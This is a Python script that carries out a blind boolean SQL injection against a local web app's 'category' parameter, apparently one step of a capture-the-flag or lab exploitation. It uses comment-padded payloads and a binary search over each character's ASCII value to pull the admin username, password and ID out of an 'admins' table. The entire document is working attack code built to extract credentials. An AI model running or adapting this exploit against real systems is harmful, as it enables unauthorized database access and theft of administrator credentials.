import requests
import time

BASE_URL = "http://127.0.0.1:33050/"
TRUE_INDICATOR = "No posts found"

def extract_char(query, position):
    """Extract single character using binary search"""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"Nature'/**/AND/**/(SELECT/**/ASCII(SUBSTRING(({query}),{position},1)))>{mid}--+-"
        resp = requests.get(f"{BASE_URL}?category={payload}", timeout=10)
        
        if TRUE_INDICATOR in resp.text:
            low = mid + 1
        else:
            high = mid - 1
    
    # Verify
    final_ascii = low
    payload = f"Nature'/**/AND/**/(SELECT/**/ASCII(SUBSTRING(({query}),{position},1)))={final_ascii}--+-"
    resp = requests.get(f"{BASE_URL}?category={payload}", timeout=10)
    
    if TRUE_INDICATOR in resp.text:
        return chr(final_ascii)
    return None

def extract_string(query, max_len=100):
    """Extract string character by character"""
    result = ""
    for pos in range(1, max_len + 1):
        char = extract_char(query, pos)
        if char is None or ord(char) == 0:
            break
        result += char
        if pos % 5 == 0:
            print(f"    Progress: '{result}'")
    return result

print("="*70)
print("EXTRACTING ADMIN CREDENTIALS")
print("="*70)

# Extract admin username
print("\n[7] Extracting admin username...")
username_query = "SELECT/**/username/**/FROM/**/admins/**/LIMIT/**/1"
admin_username = extract_string(username_query, 50)
print(f"\n[+] ADMIN USERNAME: {admin_username}")

# Extract admin password
print("\n[8] Extracting admin password...")
password_query = "SELECT/**/password/**/FROM/**/admins/**/LIMIT/**/1"
admin_password = extract_string(password_query, 100)
print(f"\n[+] ADMIN PASSWORD: {admin_password}")

# Extract id
print("\n[9] Extracting admin ID...")
id_query = "SELECT/**/id/**/FROM/**/admins/**/LIMIT/**/1"
admin_id = extract_string(id_query, 10)
print(f"\n[+] ADMIN ID: {admin_id}")

print("\n" + "="*70)
print("EXTRACTION COMPLETE")
print("="*70)
print(f"\nDatabase: blogDB")
print(f"Table: admins")
